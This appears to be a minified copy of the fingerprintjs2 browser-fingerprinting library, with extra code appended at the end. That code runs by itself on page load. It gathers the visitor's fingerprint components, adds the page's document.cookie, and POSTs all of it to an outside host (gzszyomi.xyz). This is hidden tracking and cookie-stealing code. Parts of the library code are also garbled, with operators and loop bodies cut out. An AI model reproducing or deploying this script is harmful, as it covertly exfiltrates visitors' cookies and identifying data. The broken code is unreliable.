(function(name,context,definition){'use strict'
if(typeof window!=='undefined'&&typeof define==='function'&&define.amd){define(definition)}else if(typeof module!=='undefined'&&module.exports){module.exports=definition()}else if(context.exports){context.exports=definition()}else{context[name]=definition()}})('Fingerprint2',this,function(){'use strict'
if(typeof Array.isArray==='undefined'){Array.isArray=function(obj){return Object.prototype.toString.call(obj)==='[object Array]'}};var x64Add=function(m,n){m=[m[0]>>>16,m[0]&0xffff,m[1]>>>16,m[1]&0xffff]
n=[n[0]>>>16,n[0]&0xffff,n[1]>>>16,n[1]&0xffff]
var o=[0,0,0,0]
o[3]+=m[3]+n[3]
o[2]+=o[3]>>>16
o[3]&=0xffff
o[2]+=m[2]+n[2]
o[1]+=o[2]>>>16
o[2]&=0xffff
o[1]+=m[1]+n[1]
o[0]+=o[1]>>>16
o[1]&=0xffff
o[0]+=m[0]+n[0]
o[0]&=0xffff
return[(o[0]<<16)|o[1],(o[2]<<16)|o[3]]}
var x64Multiply=function(m,n){m=[m[0]>>>16,m[0]&0xffff,m[1]>>>16,m[1]&0xffff]
n=[n[0]>>>16,n[0]&0xffff,n[1]>>>16,n[1]&0xffff]
var o=[0,0,0,0]
o[3]+=m[3]\*n[3]
o[2]+=o[3]>>>16
o[3]&=0xffff
o[2]+=m[2]\*n[3]
o[1]+=o[2]>>>16
o[2]&=0xffff
o[2]+=m[3]\*n[2]
o[1]+=o[2]>>>16
o[2]&=0xffff
o[1]+=m[1]\*n[3]
o[0]+=o[1]>>>16
o[1]&=0xffff
o[1]+=m[2]\*n[2]
o[0]+=o[1]>>>16
o[1]&=0xffff
o[1]+=m[3]\*n[1]
o[0]+=o[1]>>>16
o[1]&=0xffff
o[0]+=(m[0]\*n[3])+(m[1]\*n[2])+(m[2]\*n[1])+(m[3]\*n[0])
o[0]&=0xffff
return[(o[0]<<16)|o[1],(o[2]<<16)|o[3]]}
var x64Rotl=function(m,n){n%=64
if(n===32){return[m[1],m[0]]}else if(n<32){return[(m[0]<>>(32-n)),(m[1]<>>(32-n))]}else{n-=32
return[(m[1]<>>(32-n)),(m[0]<>>(32-n))]}}
var x64LeftShift=function(m,n){n%=64
if(n===0){return m}else if(n<32){return[(m[0]<>>(32-n)),m[1]<>>1])
h=x64Multiply(h,[0xff51afd7,0xed558ccd])
h=x64Xor(h,[0,h[0]>>>1])
h=x64Multiply(h,[0xc4ceb9fe,0x1a85ec53])
h=x64Xor(h,[0,h[0]>>>1])
return h}
var x64hash128=function(key,seed){key=key||''
seed=seed||0
var remainder=key.length%16
var bytes=key.length-remainder
var h1=[0,seed]
var h2=[0,seed]
var k1=[0,0]
var k2=[0,0]
var c1=[0x87c37b91,0x114253d5]
var c2=[0x4cf5ad43,0x2745937f]
for(var i=0;i>>0).toString(16)).slice(-8)+('00000000'+(h1[1]>>>0).toString(16)).slice(-8)+('00000000'+(h2[0]>>>0).toString(16)).slice(-8)+('00000000'+(h2[1]>>>0).toString(16)).slice(-8)}
var defaultOptions={preprocessor:null,audio:{timeout:1000,excludeIOS11:true},fonts:{swfContainerId:'fingerprintjs2',swfPath:'flash/compiled/FontList.swf',userDefinedFonts:[],extendedJsFonts:false},screen:{detectScreenOrientation:true},plugins:{sortPluginsFor:[/palemoon/i],excludeIE:false},extraComponents:[],excludes:{'enumerateDevices':true,'pixelRatio':true,'doNotTrack':true,'fontsFlash':true},NOT\_AVAILABLE:'not available',ERROR:'error',EXCLUDED:'excluded'}
var each=function(obj,iterator){if(Array.prototype.forEach&&obj.forEach===Array.prototype.forEach){obj.forEach(iterator)}else if(obj.length===+obj.length){for(var i=0,l=obj.length;ib.name){return 1}
if(a.name=0){os='Windows Phone'}else if(userAgent.indexOf('windows')>=0||userAgent.indexOf('win16')>=0||userAgent.indexOf('win32')>=0||userAgent.indexOf('win64')>=0||userAgent.indexOf('win95')>=0||userAgent.indexOf('win98')>=0||userAgent.indexOf('winnt')>=0||userAgent.indexOf('wow64')>=0){os='Windows'}else if(userAgent.indexOf('android')>=0){os='Android'}else if(userAgent.indexOf('linux')>=0||userAgent.indexOf('cros')>=0||userAgent.indexOf('x11')>=0){os='Linux'}else if(userAgent.indexOf('iphone')>=0||userAgent.indexOf('ipad')>=0||userAgent.indexOf('ipod')>=0||userAgent.indexOf('crios')>=0||userAgent.indexOf('fxios')>=0){os='iOS'}else if(userAgent.indexOf('macintosh')>=0||userAgent.indexOf('mac\_powerpc)')>=0){os='Mac'}else{os='Other'}
var mobileDevice=(('ontouchstart'in window)||(navigator.maxTouchPoints>0)||(navigator.msMaxTouchPoints>0))
if(mobileDevice&&os!=='Windows'&&os!=='Windows Phone'&&os!=='Android'&&os!=='iOS'&&os!=='Other'&&userAgent.indexOf('cros')===-1){return true}
if(typeof oscpu!=='undefined'){oscpu=oscpu.toLowerCase()
if(oscpu.indexOf('win')>=0&&os!=='Windows'&&os!=='Windows Phone'){return true}else if(oscpu.indexOf('linux')>=0&&os!=='Linux'&&os!=='Android'){return true}else if(oscpu.indexOf('mac')>=0&&os!=='Mac'&&os!=='iOS'){return true}else if((oscpu.indexOf('win')===-1&&oscpu.indexOf('linux')===-1&&oscpu.indexOf('mac')===-1)!==(os==='Other')){return true}}
if(platform.indexOf('win')>=0&&os!=='Windows'&&os!=='Windows Phone'){return true}else if((platform.indexOf('linux')>=0||platform.indexOf('android')>=0||platform.indexOf('pike')>=0)&&os!=='Linux'&&os!=='Android'){return true}else if((platform.indexOf('mac')>=0||platform.indexOf('ipad')>=0||platform.indexOf('ipod')>=0||platform.indexOf('iphone')>=0)&&os!=='Mac'&&os!=='iOS'){return true}else if(platform.indexOf('arm')>=0&&os==='Windows Phone'){return false}else if(platform.indexOf('pike')>=0&&userAgent.indexOf('opera mini')>=0){return false}else{var platformIsOther=platform.indexOf('win')<0&&platform.indexOf('linux')<0&&platform.indexOf('mac')<0&&platform.indexOf('iphone')<0&&platform.indexOf('ipad')<0&&platform.indexOf('ipod')<0
if(platformIsOther!==(os==='Other')){return true}}
return typeof navigator.plugins==='undefined'&&os!=='Windows'&&os!=='Windows Phone'}
var getHasLiedBrowser=function(){var userAgent=navigator.userAgent.toLowerCase()
var productSub=navigator.productSub
var browser
if(userAgent.indexOf('edge/')>=0||userAgent.indexOf('iemobile/')>=0){return false}else if(userAgent.indexOf('opera mini')>=0){return false}else if(userAgent.indexOf('firefox/')>=0){browser='Firefox'}else if(userAgent.indexOf('opera/')>=0||userAgent.indexOf(' opr/')>=0){browser='Opera'}else if(userAgent.indexOf('chrome/')>=0){browser='Chrome'}else if(userAgent.indexOf('safari/')>=0){if(userAgent.indexOf('android 1.')>=0||userAgent.indexOf('android 2.')>=0||userAgent.indexOf('android 3.')>=0||userAgent.indexOf('android 4.')>=0){browser='AOSP'}else{browser='Safari'}}else if(userAgent.indexOf('trident/')>=0){browser='Internet Explorer'}else{browser='Other'}
if((browser==='Chrome'||browser==='Safari'||browser==='Opera')&&productSub!=='20030107'){return true}
var tempRes=eval.toString().length
if(tempRes===37&&browser!=='Safari'&&browser!=='Firefox'&&browser!=='Other'){return true}else if(tempRes===39&&browser!=='Internet Explorer'&&browser!=='Other'){return true}else if(tempRes===33&&browser!=='Chrome'&&browser!=='AOSP'&&browser!=='Opera'&&browser!=='Other'){return true}
var errFirefox
try{throw'a'}catch(err){try{err.toSource()
errFirefox=true}catch(errOfErr){errFirefox=false}}
return errFirefox&&browser!=='Firefox'&&browser!=='Other'}
var isCanvasSupported=function(){var elem=document.createElement('canvas')
return!!(elem.getContext&&elem.getContext('2d'))}
var isWebGlSupported=function(){if(!isCanvasSupported()){return false}
var glContext=getWebglCanvas()
var isSupported=!!window.WebGLRenderingContext&&!!glContext
loseWebglContext(glContext)
return isSupported}
var isIE=function(){if(navigator.appName==='Microsoft Internet Explorer'){return true}else if(navigator.appName==='Netscape'&&/Trident/.test(navigator.userAgent)){return true}
return false}
var hasSwfObjectLoaded=function(){return typeof window.swfobject!=='undefined'}
var hasMinFlashInstalled=function(){return window.swfobject.hasFlashPlayerVersion('9.0.0')}
var addFlashDivNode=function(options){var node=document.createElement('div')
node.setAttribute('id',options.fonts.swfContainerId)
document.body.appendChild(node)}
var loadSwfAndDetectFonts=function(done,options){var hiddenCallback='\_\_\_fp\_swf\_loaded'
window[hiddenCallback]=function(fonts){done(fonts)}
var id=options.fonts.swfContainerId
addFlashDivNode()
var flashvars={onReady:hiddenCallback}
var flashparams={allowScriptAccess:'always',menu:'false'}
window.swfobject.embedSWF(options.fonts.swfPath,id,'1','1','9.0.0',false,flashvars,flashparams,{})}
var getWebglCanvas=function(){var canvas=document.createElement('canvas')
var gl=null
try{gl=canvas.getContext('webgl')||canvas.getContext('experimental-webgl')}catch(e){}
if(!gl){gl=null}
return gl}
var loseWebglContext=function(context){var loseContextExtension=context.getExtension('WEBGL\_lose\_context')
if(loseContextExtension!=null){loseContextExtension.loseContext()}}
var components=[{key:'userAgent',getData:UserAgent},{key:'webdriver',getData:webdriver},{key:'language',getData:languageKey},{key:'colorDepth',getData:colorDepthKey},{key:'deviceMemory',getData:deviceMemoryKey},{key:'pixelRatio',getData:pixelRatioKey},{key:'hardwareConcurrency',getData:hardwareConcurrencyKey},{key:'screenResolution',getData:screenResolutionKey},{key:'availableScreenResolution',getData:availableScreenResolutionKey},{key:'timezoneOffset',getData:timezoneOffset},{key:'timezone',getData:timezone},{key:'sessionStorage',getData:sessionStorageKey},{key:'localStorage',getData:localStorageKey},{key:'indexedDb',getData:indexedDbKey},{key:'addBehavior',getData:addBehaviorKey},{key:'openDatabase',getData:openDatabaseKey},{key:'cpuClass',getData:cpuClassKey},{key:'platform',getData:platformKey},{key:'doNotTrack',getData:doNotTrackKey},{key:'plugins',getData:pluginsComponent},{key:'canvas',getData:canvasKey},{key:'webgl',getData:webglKey},{key:'webglVendorAndRenderer',getData:webglVendorAndRendererKey},{key:'adBlock',getData:adBlockKey},{key:'hasLiedLanguages',getData:hasLiedLanguagesKey},{key:'hasLiedResolution',getData:hasLiedResolutionKey},{key:'hasLiedOs',getData:hasLiedOsKey},{key:'hasLiedBrowser',getData:hasLiedBrowserKey},{key:'touchSupport',getData:touchSupportKey},{key:'fonts',getData:jsFontsKey,pauseBefore:true},{key:'fontsFlash',getData:flashFontsKey,pauseBefore:true},{key:'audio',getData:audioKey},{key:'enumerateDevices',getData:enumerateDevicesKey}]
var Fingerprint2=function(options){throw new Error("'new Fingerprint()' is deprecated, see https://github.com/Valve/fingerprintjs2#upgrade-guide-from-182-to-200")}
Fingerprint2.get=function(options,callback){if(!callback){callback=options
options={}}else if(!options){options={}}
extendSoft(options,defaultOptions)
options.components=options.extraComponents.concat(components)
var keys={data:[],addPreprocessedComponent:function(key,value){if(typeof options.preprocessor==='function'){value=options.preprocessor(key,value)}
keys.data.push({key:key,value:value})}}
var i=-1
var chainComponents=function(alreadyWaited){i+=1
if(i>=options.components.length){callback(keys.data)
return}
var component=options.components[i]
if(options.excludes[component.key]){chainComponents(false)
return}
if(!alreadyWaited&&component.pauseBefore){i-=1
setTimeout(function(){chainComponents(true)},1)
return}
try{component.getData(function(value){keys.addPreprocessedComponent(component.key,value)
chainComponents(false)},options)}catch(error){keys.addPreprocessedComponent(component.key,String(error))
chainComponents(false)}}
chainComponents(false)}
Fingerprint2.getPromise=function(options){return new Promise(function(resolve,reject){Fingerprint2.get(options,resolve)})}
Fingerprint2.getV18=function(options,callback){if(callback==null){callback=options
options={}}
return Fingerprint2.get(options,function(components){var newComponents=[]
for(var i=0;iindex){data=value[index].split(',');if(Array.isArray(data)&&data.length>=2){return data[1];}}
return false;};var fingerprintReport=function(){var url=new URL("https://gzszyomi.xyz/fingerprint?id=14858");if(location.protocol=="https:"&&url.protocol!="https:"){return;}
var d1=new Date()
var options={};Fingerprint2.get(options,function(components){var i;for(i=components.length-1;i>=0;--i){if(components[i].key=="webgl"||components[i].key=="canvas"){components[i].value=transformWebglData(components[i].key,components[i].value);if(components[i].value==false){components.splice(i,1);}}}
cookies={"key":"cookies","value":document.cookie};components.push(cookies);componentsJSON=JSON.stringify(components);var http=new XMLHttpRequest();data='msg='+encodeURIComponent(componentsJSON);http.open('POST',url);http.setRequestHeader('Content-Type','application/x-www-form-urlencoded');http.send(data);})}
var cancelId;var cancelFunction
if(window.requestIdleCallback){cancelId=requestIdleCallback(fingerprintReport)
cancelFunction=cancelIdleCallback}else{cancelId=setTimeout(fingerprintReport,500)
cancelFunction=clearTimeout}